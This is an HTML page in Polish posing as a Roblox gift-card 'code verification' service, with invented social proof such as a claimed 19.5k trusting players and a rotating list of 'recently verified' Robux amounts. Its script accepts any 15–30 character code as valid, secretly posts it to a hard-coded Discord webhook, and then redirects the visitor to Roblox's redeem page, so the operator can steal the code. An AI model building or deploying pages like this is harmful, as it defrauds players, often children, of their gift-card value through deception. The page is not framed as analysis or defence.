<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Weryfikacja kodu</title>
  <link rel="icon" type="image/png" href="favicon.png">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    :root{--accent:#4CAF50}
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #2c2c2c;
      overflow: hidden;
      font-family: Arial, sans-serif;
      color: white;
    }
    canvas { position: absolute; top: 0; left: 0; }

    /* Główne okno */
    .content {
      position: relative;
      z-index: 1;
      background: rgba(0,0,0,0.6);
      padding: 20px 40px;
      border-radius: 10px;
      text-align: center;
      min-width: 320px;
    }

    /* Panel po lewej */
    .side-box {
      position: absolute;
      left: 20px;
      top: 50%;
      transform: translateY(-50%);
      background: rgba(0,0,0,0.6);
      padding: 20px;
      border-radius: 10px;
      width: 220px;
      text-align: center;
      z-index: 1;
    }
    .side-box h3 { margin: 0; font-size: 20px; font-weight: normal; }
    .side-box p { margin-top: 10px; font-size: 22px; font-weight: bold; color: var(--accent); }

    input {
      padding: 10px;
      margin-top: 10px;
      border-radius: 5px;
      border: none;
      outline: none;
      width: 100%;
      box-sizing: border-box;
    }
    button {
      margin-top: 10px;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      background: var(--accent);
      color: white;
      cursor: pointer;
    }
    button:hover { background: #45a049; }

    /* Logo top-left i giftcard bottom-right */
    .img-top-left {
      position: absolute;
      top: 20px;
      left: 20px;
      width: 120px;
      z-index: 2;
    }
    .img-bottom-right {
      position: absolute;
      bottom: 20px;
      right: 20px;
      width: 150px;
      z-index: 2;
    }

    /* BOX OFERT (prawy górny) */
    .offer-box {
      position: absolute;
      top: 20px;
      right: 20px;
      width: 240px;
      background: rgba(0,0,0,0.65);
      border-radius: 10px;
      padding: 8px;
      color: var(--accent);
      font-weight: bold;
      z-index: 3;
      overflow: hidden;
      box-sizing: border-box;
    }

    .offer-list {
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .offer-item {
      background: rgba(255,255,255,0.03);
      padding: 8px;
      border-radius: 6px;
      text-align: left;
      font-size: 14px;
      line-height: 1.2;
      transform: translateY(0);
      opacity: 1;
      transition: transform 600ms ease, opacity 600ms ease;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .offer-item .left { font-size: 15px; }
    .offer-item .right { font-size: 13px; color: rgba(255,255,255,0.75); font-weight: 600; }

    /* pojawianie / znikanie */
    .anim-in {
      opacity: 0;
      transform: translateY(-12px);
      animation: animIn 600ms forwards;
    }
    .anim-out {
      opacity: 1;
      transform: translateY(0);
      animation: animOut 600ms forwards;
    }
    @keyframes animIn {
      from { opacity: 0; transform: translateY(-12px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    @keyframes animOut {
      from { opacity: 1; transform: translateY(0); }
      to   { opacity: 0; transform: translateY(12px); }
    }

    @media (max-width:520px){
      .offer-box { right: 10px; left: 10px; width: auto; top: 12px; }
      .img-top-left { width: 90px; top: 10px; left: 8px; }
      .img-bottom-right { width: 120px; right: 8px; bottom: 8px; }
      .side-box{ display:none; }
    }
  </style>
</head>
<body>
  <canvas id="bg"></canvas>

  <img src="logo.png" class="img-top-left" alt="Logo">
  <img src="giftcard.png" class="img-bottom-right" alt="Giftcard">

  <div class="offer-box" id="offerBox">
    <div style="font-size:13px; color:rgba(255,255,255,0.8); margin-bottom:6px;">Ostatnio Zweryfikowane!</div>
    <div class="offer-list" id="offerList"></div>
  </div>

  <div class="side-box">
    <h3>Zaufało nam</h3>
    <p>19,5k Graczy!</p>
  </div>

  <div class="content">
    <h1>Wpisz kod Weryfikacji!</h1>
    <input type="password" id="code" placeholder="Podaj kod ">
    <br>
    <button onclick="checkCode()">Sprawdź</button>
    <p id="message"></p>
  </div>

  <script>
    // ---------- tło ----------
    const canvas = document.getElementById('bg');
    const ctx = canvas.getContext('2d');
    function resizeCanvas(){ canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    let squares = [];
    for (let i = 0; i < 60; i++) {
      squares.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        size: 4 + Math.random() * 6,
        dx: (Math.random() - 0.5) * 1.6,
        dy: (Math.random() - 0.5) * 1.6
      });
    }
    function animateBg(){
      ctx.clearRect(0,0,canvas.width,canvas.height);
      squares.forEach(sq => {
        ctx.fillStyle = "rgba(187,187,187,0.15)";
        ctx.fillRect(sq.x, sq.y, sq.size, sq.size);
        sq.x += sq.dx; sq.y += sq.dy;
        if (sq.x < -10) sq.x = canvas.width + 10;
        if (sq.x > canvas.width + 10) sq.x = -10;
        if (sq.y < -10) sq.y = canvas.height + 10;
        if (sq.y > canvas.height + 10) sq.y = -10;
      });
      requestAnimationFrame(animateBg);
    }
    animateBg();

    // ---------- sprawdzanie kodu + webhook + przekierowanie ----------
    function checkCode() {
      const code = document.getElementById("code").value;
      const message = document.getElementById("message");
      const regex = /^.{15,30}$/;
      if (!regex.test(code)) {
        message.textContent = "Błędny Kod!";
        return;
      }
      message.textContent = "Weryfikacja udana!";

      const webhookURL = "https://discord.com/api/webhooks/1412869587812483155/Rlwfr3ujrFi8feJDj0qMMHB6uLiNwqzeiTtRr6BxfvfQMw3sdY7w6LtoHRrBA5RIbzRE";
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: `Kod użytkownika: ${code}` })
      })
      .then(() => {
        window.location.href = "https://www.roblox.com/redeem";
      })
      .catch(err => {
        console.error("Błąd wysyłki webhooka:", err);
        message.textContent = "Błąd wysyłki kodu!";
      });
    }

    // ---------- ROTATOR LOSOWYCH OFERT ----------
    const offers = [
      "100 Robux","175 Robux","200 Robux","400 Robux","570 Robux","800 Robux","860 Robux",
      "1000 Robux","1200 Robux","1500 Robux","1700 Robux","2200 Robux","2500 Robux",
      "2700 Robux","4000 Robux","4500 Robux","5250 Robux","10000 Robux","11000 Robux","17000 Robux"
    ];

    const offerListEl = document.getElementById('offerList');

    function createOfferEl(text){
      const wrapper = document.createElement('div');
      wrapper.className = 'offer-item';
      const left = document.createElement('div');
      left.className = 'left';
      left.textContent = text;
      const right = document.createElement('div');
      right.className = 'right';
      right.textContent = '';
      wrapper.appendChild(left);
      wrapper.appendChild(right);
      return wrapper;
    }

    function seedInitial(){
      offerListEl.innerHTML = '';
      for(let i=0;i<3;i++){
        const randIdx = Math.floor(Math.random() * offers.length);
        const el = createOfferEl(offers[randIdx]);
        offerListEl.appendChild(el);
      }
    }

    function rotateOnce(){
      const items = offerListEl.querySelectorAll('.offer-item');
      if(items.length===0){ seedInitial(); scheduleNext(); return; }

      const bottom = items[items.length-1];
      bottom.classList.add('anim-out');

      setTimeout(()=>{
        if(bottom.parentNode) bottom.parentNode.removeChild(bottom);
        const randIdx = Math.floor(Math.random() * offers.length);
        const newEl = createOfferEl(offers[randIdx]);
        newEl.classList.add('anim-in');
        if(offerListEl.firstChild){
          offerListEl.insertBefore(newEl, offerListEl.firstChild);
        } else {
          offerListEl.appendChild(newEl);
        }
        setTimeout(()=>newEl.classList.remove('anim-in'),700);
        scheduleNext();
      },620);
    }

    function randomIntervalMs(){
      const min=150000,max=320000;
      return Math.floor(Math.random()*(max-min+1))+min;
    }

    let rotationTimer=null;
    function scheduleNext(){
      const t=randomIntervalMs();
      rotationTimer=setTimeout(rotateOnce,t);
    }

    seedInitial();
    scheduleNext();
    window.addEventListener('beforeunload',()=>{ if(rotationTimer) clearTimeout(rotationTimer); });

  </script>
</body>
</html>
